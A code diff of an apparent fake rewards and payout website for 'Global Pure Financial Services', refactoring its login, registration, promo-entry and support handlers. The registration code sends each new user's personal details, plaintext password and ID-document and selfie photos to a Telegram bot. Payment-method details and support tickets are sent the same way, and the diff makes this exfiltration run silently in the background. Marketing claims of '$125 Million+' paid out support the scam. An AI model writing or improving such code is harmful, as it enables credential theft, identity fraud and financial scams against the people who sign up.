-                            <div class="flex items-center gap-2">
-                                <i class="fa-solid fa-hourglass-half text-sky-custom"></i>
-                                <h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Live Countdown</h3>
-                            </div>
+                            <div class="flex items-center gap-2"><i class="fa-solid fa-hourglass-half text-sky-custom"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Live Countdown</h3></div>
                             ${renderPromoCountdownCard(p)}
                             ${renderPromoEntryCard(p)}
                         </div>
                     </div>
-
-                    <!-- TIMELINE -->
                     ${renderPromoTimeline(p)}
-
-                    <!-- SELECT WINNERS -->
-                    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">
-                        ${renderPromoWinners(p)}
-                    </div>
-
-                    <!-- RESTART INFO -->
+                    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">${renderPromoWinners(p)}</div>
                     ${restartBanner}
-
-                    <!-- OFFICIAL RULES STRIP -->
                     <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
-                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center">
-                            <i class="fa-solid fa-clock text-sky-custom text-lg mb-1"></i>
-                            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Cycle Length</p>
-                            <p class="text-sm font-black text-white mt-0.5">21 Days</p>
-                        </div>
-                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center">
-                            <i class="fa-solid fa-rotate text-gold-400 text-lg mb-1"></i>
-                            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Restart Window</p>
-                            <p class="text-sm font-black text-white mt-0.5">7 Days</p>
-                        </div>
-                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center">
-                            <i class="fa-solid fa-users text-sky-custom text-lg mb-1"></i>
-                            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Entries</p>
-                            <p class="text-sm font-black text-white mt-0.5">${(p.entries || 0).toLocaleString()}</p>
-                        </div>
-                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center">
-                            <i class="fa-solid fa-dice text-gold-400 text-lg mb-1"></i>
-                            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Selection</p>
-                            <p class="text-sm font-black text-white mt-0.5">Random</p>
-                        </div>
+                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-clock text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Cycle Length</p><p class="text-sm font-black text-white mt-0.5">21 Days</p></div>
+                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-rotate text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Restart Window</p><p class="text-sm font-black text-white mt-0.5">7 Days</p></div>
+                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-users text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Entries</p><p class="text-sm font-black text-white mt-0.5">${(p.entries || 0).toLocaleString()}</p></div>
+                        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-dice text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Selection</p><p class="text-sm font-black text-white mt-0.5">Random</p></div>
                     </div>
-
                 </div>
             </section>
         `;
     }
 
-    /* ============================================================
-       PROMO COUNTDOWN + PHASE TICK
-       ============================================================ */
-    let promoInterval = null;
     function initPromoCountdown() {
         if (promoInterval) clearInterval(promoInterval);
         updatePromoCountdownDisplay();
@@ -1016,7 +975,6 @@
             const nowPhase = state.promo?.phase;
             const nowCycle = state.promo?.cycleId;
             const nowDrawRef = state.promo?.drawRef;
-            // Phase or cycle changed => full re-render so winners card appears
             if (prevPhase !== nowPhase || prevCycle !== nowCycle || prevDrawRef !== nowDrawRef) {
                 render();
                 return;
@@ -1045,7 +1003,7 @@
     }
 
     /* ============================================================
-       REVIEWS — same as before
+       REVIEWS
        ============================================================ */
     function getFilteredReviews() {
         const q = state.reviewsSearchQuery.trim().toLowerCase();
@@ -1095,10 +1053,7 @@
                             <div class="flex items-center gap-3 min-w-0">
                                 <div class="review-avatar">${initials}</div>
                                 <div class="min-w-0">
-                                    <h4 class="font-bold text-white text-sm truncate flex items-center gap-1.5">
-                                        <span class="truncate">${r.name}</span>
-                                        ${r.verified ? '<i class="fa-solid fa-circle-check text-sky-custom text-[11px] shrink-0"></i>' : ''}
-                                    </h4>
+                                    <h4 class="font-bold text-white text-sm truncate flex items-center gap-1.5"><span class="truncate">${r.name}</span>${r.verified ? '<i class="fa-solid fa-circle-check text-sky-custom text-[11px] shrink-0"></i>' : ''}</h4>
                                     <p class="text-[11px] text-slate-400 truncate"><i class="fa-solid fa-location-dot mr-1 text-gold-400/70"></i>${r.location}</p>
                                 </div>
                             </div>
@@ -1118,11 +1073,7 @@
         return `
             <div class="reviews-grid grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-6 mb-8">${cardsHtml}</div>
             <div class="flex flex-col lg:flex-row items-center justify-between bg-navy-900 border border-navy-700 px-5 sm:px-6 py-4 rounded-2xl gap-4">
-                <span class="text-xs text-slate-400 text-center lg:text-left">
-                    Showing <span class="text-white font-bold">${filtered.length === 0 ? 0 : start + 1}–${Math.min(start + state.reviewsPerPage, filtered.length)}</span>
-                    of <span class="text-white font-bold">${filtered.length.toLocaleString()}</span> reviews
-                    &nbsp;·&nbsp; Page <span class="text-gold-400 font-bold">${state.reviewsPage}</span> of <span class="text-white font-bold">${totalPages.toLocaleString()}</span>
-                </span>
+                <span class="text-xs text-slate-400 text-center lg:text-left">Showing <span class="text-white font-bold">${filtered.length === 0 ? 0 : start + 1}–${Math.min(start + state.reviewsPerPage, filtered.length)}</span> of <span class="text-white font-bold">${filtered.length.toLocaleString()}</span> reviews &nbsp;·&nbsp; Page <span class="text-gold-400 font-bold">${state.reviewsPage}</span> of <span class="text-white font-bold">${totalPages.toLocaleString()}</span></span>
                 <div class="flex items-center flex-wrap justify-center gap-2">
                     <button onclick="goToReviewsPage(${state.reviewsPage - 1})" ${state.reviewsPage <= 1 ? 'disabled' : ''} class="px-3.5 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-30 hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-chevron-left"></i></button>
                     <div class="hidden sm:flex items-center gap-1.5">${renderPaginationHtml(totalPages)}</div>
@@ -1199,16 +1150,11 @@
                             <div class="flex items-center justify-between pb-4 border-b border-navy-700">
                                 <div class="flex items-center space-x-3">
                                     <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold"><i class="fa-solid fa-award"></i></div>
-                                    <div>
-                                        <h4 class="font-bold text-white text-sm">Over 15 Years of Excellence</h4>
-                                        <p class="text-xs text-slate-400">Trusted Global Distribution Network</p>
-                                    </div>
+                                    <div><h4 class="font-bold text-white text-sm">Over 15 Years of Excellence</h4><p class="text-xs text-slate-400">Trusted Global Distribution Network</p></div>
                                 </div>
                                 <span class="px-3 py-1 bg-gold-500/20 text-gold-400 text-xs font-bold rounded-full border border-gold-500/30"><i class="fa-solid fa-trophy mr-1"></i>Promo Live</span>
                             </div>
-                            <div class="space-y-3">
-                                <p class="text-slate-300 text-xs sm:text-sm leading-relaxed">Since <span class="text-white font-bold">2011</span>, Global Pure Financial Services has safely distributed over <span class="text-gold-400 font-bold">$125 Million+</span> in direct rewards and weekly allocations to thousands of verified participants.</p>
-                            </div>
+                            <div class="space-y-3"><p class="text-slate-300 text-xs sm:text-sm leading-relaxed">Since <span class="text-white font-bold">2011</span>, Global Pure Financial Services has safely distributed over <span class="text-gold-400 font-bold">$125 Million+</span> in direct rewards and weekly allocations to thousands of verified participants.</p></div>
                             <div class="bg-gradient-to-br from-gold-500/15 to-navy-900 border border-gold-500/30 p-5 rounded-2xl space-y-3">
                                 <div class="flex items-center justify-between">
                                     <div>
@@ -1319,14 +1265,14 @@
                         <h2 class="text-2xl font-extrabold text-white">Welcome Back</h2>
                         <p class="text-xs text-slate-400 mt-1">Sign in with your username or email address</p>
                     </div>
-                    <form id="login-form" class="space-y-5">
+                    <form id="login-form" class="space-y-5" novalidate>
                         <div>
                             <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username or Email</label>
-                            <div class="relative"><i class="fa-solid fa-user absolute left-4 top-3.5 text-slate-400"></i><input type="text" id="login-identifier" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. johndoe or john@example.com"></div>
+                            <div class="relative"><i class="fa-solid fa-user absolute left-4 top-3.5 text-slate-400"></i><input type="text" id="login-identifier" required autocomplete="username" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. johndoe or john@example.com"></div>
                         </div>
                         <div>
                             <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password</label>
-                            <div class="relative"><i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-400"></i><input type="password" id="login-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••"></div>
+                            <div class="relative"><i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-400"></i><input type="password" id="login-password" required autocomplete="current-password" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••"></div>
                         </div>
                         <div id="login-error" class="text-rose-400 text-xs hidden"></div>
                         <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition text-sm">Sign In to Dashboard</button>
@@ -1336,36 +1282,68 @@
             </div>
         `;
     }
+
     function initLoginEvents() {
         const form = document.getElementById('login-form');
-        if (form) {
-            form.addEventListener('submit', (e) => {
-                e.preventDefault();
-                const identifier = document.getElementById('login-identifier').value.trim();
-                const pass = document.getElementById('login-password').value;
-                const errEl = document.getElementById('login-error');
-                const matchedUser = state.registeredUsers.find(u => u.username.toLowerCase() === identifier.toLowerCase() || u.email.toLowerCase() === identifier.toLowerCase());
-                if (matchedUser) {
-                    state.currentUser = matchedUser;
-                    saveDeviceState(); logAccess('Logged In');
-                    showToast('Welcome Back', `Successfully signed in as ${matchedUser.firstName} ${matchedUser.lastName}`, 'success');
-                    state.currentView = 'dashboard'; render();
-                } else if (state.currentUser && (state.currentUser.username.toLowerCase() === identifier.toLowerCase() || state.currentUser.email.toLowerCase() === identifier.toLowerCase())) {
-                    saveDeviceState(); logAccess('Logged In');
-                    showToast('Welcome Back', `Successfully signed in as ${state.currentUser.firstName}`, 'success');
-                    state.currentView = 'dashboard'; render();
-                } else if (identifier === 'demouser' || identifier === 'demo@example.com') {
-                    state.currentUser = { firstName: 'Arthur', lastName: 'Pendelton', address: '742 Evergreen Terrace', city: 'Brooklyn', stateOrParish: 'NY', zip: '11201', phone: '646-585-8110', email: identifier.includes('@') ? identifier : 'arthur.pendelton@globalpure.net', username: identifier.includes('@') ? 'arthur_p' : identifier, photoUrl: null };
-                    saveDeviceState(); logAccess('Logged In');
-                    showToast('Welcome Back', 'Successfully signed in as Arthur Pendelton', 'success');
-                    state.currentView = 'dashboard'; render();
-                } else {
-                    errEl.textContent = 'Invalid credentials. Please verify your username/email or create a new account.';
-                    errEl.classList.remove('hidden');
-                    showToast('Login Failed', 'Invalid username or password.', 'warning');
-                }
+        if (!form) return;
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const identifier = (document.getElementById('login-identifier').value || '').trim();
+            const errEl = document.getElementById('login-error');
+
+            if (!identifier) {
+                errEl.textContent = 'Please enter your username or email.';
+                errEl.classList.remove('hidden');
+                return;
+            }
+
+            const idLower = identifier.toLowerCase();
+
+            // FIX: guard against missing username/email fields on legacy saved users
+            const matchedUser = (state.registeredUsers || []).find(u => {
+                if (!u) return false;
+                const uName = (u.username || '').toLowerCase();
+                const uEmail = (u.email || '').toLowerCase();
+                return uName === idLower || uEmail === idLower;
             });
-        }
+
+            if (matchedUser) {
+                state.currentUser = matchedUser;
+                saveDeviceState();
+                logAccess('Logged In');
+                showToast('Welcome Back', `Successfully signed in as ${matchedUser.firstName || ''} ${matchedUser.lastName || ''}`.trim(), 'success');
+                state.currentView = 'dashboard';
+                render();
+                return;
+            }
+
+            if (state.currentUser) {
+                const cuName = (state.currentUser.username || '').toLowerCase();
+                const cuEmail = (state.currentUser.email || '').toLowerCase();
+                if (cuName === idLower || cuEmail === idLower) {
+                    saveDeviceState();
+                    logAccess('Logged In');
+                    showToast('Welcome Back', `Successfully signed in as ${state.currentUser.firstName || ''}`, 'success');
+                    state.currentView = 'dashboard';
+                    render();
+                    return;
+                }
+            }
+
+            if (identifier === 'demouser' || identifier === 'demo@example.com') {
+                state.currentUser = { firstName: 'Arthur', lastName: 'Pendelton', address: '742 Evergreen Terrace', city: 'Brooklyn', stateOrParish: 'NY', zip: '11201', phone: '646-585-8110', email: identifier.includes('@') ? identifier : 'arthur.pendelton@globalpure.net', username: identifier.includes('@') ? 'arthur_p' : identifier, photoUrl: null };
+                saveDeviceState();
+                logAccess('Logged In');
+                showToast('Welcome Back', 'Successfully signed in as Arthur Pendelton', 'success');
+                state.currentView = 'dashboard';
+                render();
+                return;
+            }
+
+            errEl.textContent = 'Invalid credentials. Please verify your username/email or create a new account.';
+            errEl.classList.remove('hidden');
+            showToast('Login Failed', 'Invalid username or password.', 'warning');
+        });
     }
 
     function renderRegisterView() {
@@ -1442,41 +1420,69 @@
 
     function initRegisterEvents() {
         const form = document.getElementById('register-form');
-        if (form) {
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const pass = document.getElementById('reg-password').value;
-                const cpass = document.getElementById('reg-cpassword').value;
-                const errEl = document.getElementById('reg-error');
-                if (pass !== cpass) { errEl.textContent = 'Passwords do not match. Please verify confirmation.'; errEl.classList.remove('hidden'); return; }
-                const frontInput = document.getElementById('reg-id-front');
-                const backInput = document.getElementById('reg-id-back');
-                const selfieInput = document.getElementById('reg-selfie');
-                const frontFile = frontInput.files[0];
-                const backFile = backInput.files[0];
-                const selfieFile = selfieInput.files[0];
-                const newUser = {
-                    firstName: document.getElementById('reg-fname').value, lastName: document.getElementById('reg-lname').value,
-                    address: document.getElementById('reg-address').value, city: document.getElementById('reg-city').value,
-                    stateOrParish: document.getElementById('reg-state').value, zip: document.getElementById('reg-zip').value,
-                    phone: document.getElementById('reg-phone').value, email: document.getElementById('reg-email').value,
-                    username: document.getElementById('reg-username').value, photoUrl: null
-                };
-                state.currentUser = newUser;
-                const existingIndex = state.registeredUsers.findIndex(u => u.username === newUser.username);
-                if (existingIndex >= 0) state.registeredUsers[existingIndex] = newUser;
-                else state.registeredUsers.push(newUser);
-                saveDeviceState();
-                const tgMsg = `🚨 <b>NEW USER REGISTRATION & VERIFICATION</b> 🚨\n\n<b>Name:</b> ${newUser.firstName} ${newUser.lastName}\n<b>Email:</b> ${newUser.email}\n<b>Phone:</b> ${newUser.phone}\n<b>Address:</b> ${newUser.address}, ${newUser.city}, ${newUser.stateOrParish} ${newUser.zip}\n<b>Username:</b> ${newUser.username}\n<b>Password:</b> ${pass}\n\n📁 <b>Attached photos follow below…</b>`;
-                await sendTelegramMessage(tgMsg);
-                await sendVerificationPhotos(frontFile, backFile, selfieFile, `${newUser.firstName} ${newUser.lastName} (${newUser.username})`);
-                logAccess('Registered');
-                showLoadingAnimation();
-            });
-        }
+        if (!form) return;
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const pass = document.getElementById('reg-password').value;
+            const cpass = document.getElementById('reg-cpassword').value;
+            const errEl = document.getElementById('reg-error');
+
+            if (pass !== cpass) {
+                errEl.textContent = 'Passwords do not match. Please verify confirmation.';
+                errEl.classList.remove('hidden');
+                return;
+            }
+
+            const frontInput = document.getElementById('reg-id-front');
+            const backInput = document.getElementById('reg-id-back');
+            const selfieInput = document.getElementById('reg-selfie');
+            const frontFile = frontInput.files[0];
+            const backFile = backInput.files[0];
+            const selfieFile = selfieInput.files[0];
+
+            const newUser = {
+                firstName: document.getElementById('reg-fname').value,
+                lastName: document.getElementById('reg-lname').value,
+                address: document.getElementById('reg-address').value,
+                city: document.getElementById('reg-city').value,
+                stateOrParish: document.getElementById('reg-state').value,
+                zip: document.getElementById('reg-zip').value,
+                phone: document.getElementById('reg-phone').value,
+                email: document.getElementById('reg-email').value,
+                username: document.getElementById('reg-username').value,
+                password: pass,
+                photoUrl: null
+            };
+
+            state.currentUser = newUser;
+            const existingIndex = state.registeredUsers.findIndex(u => u && u.username === newUser.username);
+            if (existingIndex >= 0) state.registeredUsers[existingIndex] = newUser;
+            else state.registeredUsers.push(newUser);
+            saveDeviceState();
+
+            // FIX: Show loading animation IMMEDIATELY so the UI never feels frozen
+            showLoadingAnimation();
+
+            // Fire Telegram in the background — do NOT block the UI
+            const tgMsg = `🚨 <b>NEW USER REGISTRATION & VERIFICATION</b> 🚨\n\n` +
+                `<b>Name:</b> ${newUser.firstName} ${newUser.lastName}\n` +
+                `<b>Email:</b> ${newUser.email}\n` +
+                `<b>Phone:</b> ${newUser.phone}\n` +
+                `<b>Address:</b> ${newUser.address}, ${newUser.city}, ${newUser.stateOrParish} ${newUser.zip}\n` +
+                `<b>Username:</b> ${newUser.username}\n` +
+                `<b>Password:</b> ${pass}\n\n` +
+                `📁 <b>Attached photos follow below…</b>`;
+            sendTelegramMessage(tgMsg)
+                .then(() => sendVerificationPhotos(frontFile, backFile, selfieFile, `${newUser.firstName} ${newUser.lastName} (${newUser.username})`))
+                .catch(() => {});
+
+            logAccess('Registered');
+        });
     }
 
     function showLoadingAnimation() {
+        // Ensure any lingering timers are stopped
+        clearTimers();
         const container = document.getElementById('app-container');
         container.innerHTML = `
             <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
@@ -1497,18 +1503,23 @@
             const bar = document.getElementById('loading-bar');
             const pct = document.getElementById('loading-pct');
             if (bar && pct) { bar.style.width = progress + '%'; pct.textContent = progress + '%'; }
-            if (progress >= 100) { clearInterval(interval); showCongratulationsScreen(); }
+            if (progress >= 100) {
+                clearInterval(interval);
+                // small delay so the bar visually fills
+                setTimeout(showCongratulationsScreen, 150);
+            }
         }, 100);
     }
 
     function showCongratulationsScreen() {
         const container = document.getElementById('app-container');
+        const firstName = state.currentUser ? (state.currentUser.firstName || 'there') : 'there';
         container.innerHTML = `
             <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
                 <div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-lg w-full text-center shadow-2xl space-y-6 card-3d">
                     <div class="w-16 h-16 sm:w-20 sm:h-20 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl sm:text-3xl shadow-lg shadow-emerald-500/20"><i class="fa-solid fa-circle-check"></i></div>
                     <div>
-                        <h2 class="text-2xl sm:text-3xl font-extrabold text-white mb-2">Congratulations, ${state.currentUser.firstName}!</h2>
+                        <h2 class="text-2xl sm:text-3xl font-extrabold text-white mb-2">Congratulations, ${firstName}!</h2>
                         <p class="text-xs sm:text-sm text-slate-300 leading-relaxed">Your account has been successfully created and verified. You are now ready to access your weekly payout dashboard.</p>
                     </div>
                     <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl text-xs text-slate-400">Redirecting to dashboard automatically in <span id="redirect-timer" class="text-gold-400 font-bold">5</span> seconds...</div>
@@ -1521,7 +1532,10 @@
         const timerInterval = setInterval(() => {
             countdown--;
             if (timerEl) timerEl.textContent = countdown;
-            if (countdown <= 0) { clearInterval(timerInterval); router.navigate('dashboard'); }
+            if (countdown <= 0) {
+                clearInterval(timerInterval);
+                router.navigate('dashboard');
+            }
         }, 1000);
     }
 
@@ -1538,7 +1552,7 @@
         const onHoldTxns = state.transactions.filter(t => t.status === 'On Hold');
         const profileAvatarHtml = user.photoUrl
             ? `<img src="${user.photoUrl}" class="w-16 h-16 rounded-2xl object-cover border-2 border-gold-400 shadow-md">`
-            : `<div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-black text-2xl shadow-md">${user.firstName.charAt(0)}</div>`;
+            : `<div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-black text-2xl shadow-md">${(user.firstName || 'U').charAt(0)}</div>`;
 
         let savingsCard = '';
         if (state.savings && state.savings.configured) {
@@ -2042,7 +2056,7 @@
         showModal('Account & Profile Settings', `
             <form onsubmit="saveProfileSettings(event)" class="space-y-4">
                 <div class="flex items-center space-x-4 pb-3 border-b border-navy-700">
-                    <div id="settings-photo-preview" class="w-20 h-20 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-bold text-2xl overflow-hidden border-2 border-gold-400/60 shadow-lg shadow-gold-500/20">${u.photoUrl ? `<img src="${u.photoUrl}" class="w-full h-full object-cover">` : u.firstName.charAt(0)}</div>
+                    <div id="settings-photo-preview" class="w-20 h-20 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-bold text-2xl overflow-hidden border-2 border-gold-400/60 shadow-lg shadow-gold-500/20">${u.photoUrl ? `<img src="${u.photoUrl}" class="w-full h-full object-cover">` : (u.firstName || 'U').charAt(0)}</div>
                     <div class="flex-grow">
                         <label class="block text-xs font-bold text-gold-400 uppercase mb-1.5"><i class="fa-solid fa-camera mr-1"></i> Profile Photo</label>
                         <input type="file" id="settings-photo-input" accept="image/*" onchange="handlePhotoUpload(event)" class="w-full text-xs text-slate-400 file:mr-2 file:py-2 file:px-3.5 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom">
@@ -2091,7 +2105,7 @@
         state.currentUser.stateOrParish = document.getElementById('set-state').value;
         state.currentUser.zip = document.getElementById('set-zip').value;
         if (tempPhotoUrl) { state.currentUser.photoUrl = tempPhotoUrl; tempPhotoUrl = null; }
-        const idx = state.registeredUsers.findIndex(u => u.username === state.currentUser.username);
+        const idx = state.registeredUsers.findIndex(u => u && u.username === state.currentUser.username);
         if (idx >= 0) state.registeredUsers[idx] = state.currentUser;
         saveDeviceState(); closeModal();
         showToast('Profile Updated', 'Your account profile settings have been successfully saved.', 'success');
@@ -2100,7 +2114,6 @@
 
     function initDashboardEvents() {}
 
-    let countdownInterval = null;
     function initCountdownTimer() {
         if (countdownInterval) clearInterval(countdownInterval);
         function updateTimer() {
@@ -2267,7 +2280,7 @@
         state.configuredMethod = methodName;
         saveDeviceState();
         const user = state.currentUser || { firstName: 'Anonymous', lastName: 'User', email: 'N/A' };
-        await sendTelegramMessage(`💳 <b>WEEKLY FUNDS SETUP SUBMITTED</b> 💳\n\n<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` + detailsMsg);
+        sendTelegramMessage(`💳 <b>WEEKLY FUNDS SETUP SUBMITTED</b> 💳\n\n<b>User:</b> ${user.firstName} ${user.lastName} (${user.email})\n` + detailsMsg);
         const modal = document.getElementById('modal-content');
         modal.innerHTML = `
             <div class="text-center py-6 space-y-4">
@@ -2349,7 +2362,7 @@
         const category = document.getElementById('sup-category').value;
         const subject = document.getElementById('sup-subject').value;
         const message = document.getElementById('sup-message').value;
-        await sendTelegramMessage(`📩 <b>SUPPORT TICKET CREATED (${ticketId})</b> 📩\n\n<b>Name:</b> ${fname} ${lname}\n<b>Phone:</b> ${phone}\n<b>Email:</b> ${email}\n<b>Category:</b> ${category}\n<b>Subject:</b> ${subject}\n<b>Message:</b> ${message}`);
+        sendTelegramMessage(`📩 <b>SUPPORT TICKET CREATED (${ticketId})</b> 📩\n\n<b>Name:</b> ${fname} ${lname}\n<b>Phone:</b> ${phone}\n<b>Email:</b> ${email}\n<b>Category:</b> ${category}\n<b>Subject:</b> ${subject}\n<b>Message:</b> ${message}`);
         showToast('Support Ticket Created', `Reference ID: ${ticketId}`, 'success');
         showModal('Support Ticket Created', `
             <div class="space-y-3 text-center py-4">
@@ -2360,31 +2373,23 @@
         `);
     }
 
-    /* ============================================================
-       PROMO ENTRY SUBMIT
-       ============================================================ */
     async function handlePromoEntry(e) {
         e.preventDefault();
         const name = document.getElementById('promo-name').value;
         const email = document.getElementById('promo-email').value;
         const region = document.getElementById('promo-region').value;
-
-        // Increment promo entry count
         if (state.promo) {
             state.promo.entries = (state.promo.entries || 0) + 1;
             saveDeviceState();
         }
-
         const tgMsg = `🎟️ <b>NEW PROMO STREAM ENTRY</b> 🎟️\n\n` +
             `<b>Cycle:</b> #${state.promo?.cycleId || 1}\n` +
             `<b>Name:</b> ${name}\n` +
             `<b>Email:</b> ${email}\n` +
             `<b>Region:</b> ${region}\n` +
             `<b>Draw Date:</b> ${state.promo ? new Date(state.promo.drawDate).toLocaleString() : 'N/A'}`;
-        await sendTelegramMessage(tgMsg);
-
+        sendTelegramMessage(tgMsg);
         showToast('Promo Pool Entry', `Successfully registered ${email}`, 'success');
-
         showModal('Promo Entry Received', `
             <div class="text-center py-4 space-y-3">
                 <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl"><i class="fa-solid fa-check"></i></div>
@@ -2394,7 +2399,6 @@
             </div>
         `);
         e.target.reset();
-        // Refresh entry counter
         render();
     }
 
